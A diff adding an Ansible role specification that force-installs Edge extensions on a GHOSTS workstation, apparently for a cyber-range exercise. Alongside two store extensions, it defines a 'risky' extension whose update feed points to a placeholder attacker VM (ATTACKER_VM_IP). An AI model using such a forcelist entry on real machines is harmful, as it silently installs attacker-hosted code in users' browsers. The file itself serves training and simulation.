@@ -1,0 +1,41 @@
+---
+argument_specs:
+  main:
+    short_description: Force-install Edge extensions on a GHOSTS workstation
+    description:
+      - Writes HKLM:\SOFTWARE\Policies\Microsoft\Edge\ExtensionInstallForcelist entries, one per benign
+        extension (numbered from 1, with fgnw_browser_extensions_update_url as the update URL) and a last
+        one for the risky extension with its own update feed.
+      - Every input has a default; FGNW-browser-extensions.yml passes nothing.
+    options:
+      fgnw_browser_extensions_benign:
+        type: list
+        elements: dict
+        default:
+          - name: uBlock Origin
+            id: odfafepnkmbhccpbejgmiehpchacaeak
+          - name: Grammarly
+            id: cnlefmmeadmemmdciolhbnfeacpdfbkd
+        description:
+          - Extensions installed from the Edge Add-ons store. Each element carries C(name), a label used
+            only in task output, and C(id), the 32-character extension id.
+      fgnw_browser_extensions_update_url:
+        type: str
+        default: https://edge.microsoft.com/extensionwebstorebase/v1/crx
+        description: Update URL written after every benign extension id (the Edge Add-ons store feed).
+      fgnw_browser_extensions_attacker_ip:
+        type: str
+        default: ATTACKER_VM_IP
+        description:
+          - Address of the attacker VM that hosts the risky extension's update feed; it is interpolated
+            into the default fgnw_browser_extensions_risky.update_url.
+          - No play in this repository sets it, so the default is a literal placeholder.
+      fgnw_browser_extensions_risky:
+        type: dict
+        default:
+          name: Konoha Form Helper
+          id: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+          update_url: http://{{ fgnw_browser_extensions_attacker_ip | default('ATTACKER_VM_IP') }}/extensions/konoha-form-helper/update.xml
+        description:
+          - The self-hosted risky extension, written as the last forcelist entry. C(name) is a label,
+            C(id) the extension id and C(update_url) the feed Edge fetches the CRX from.
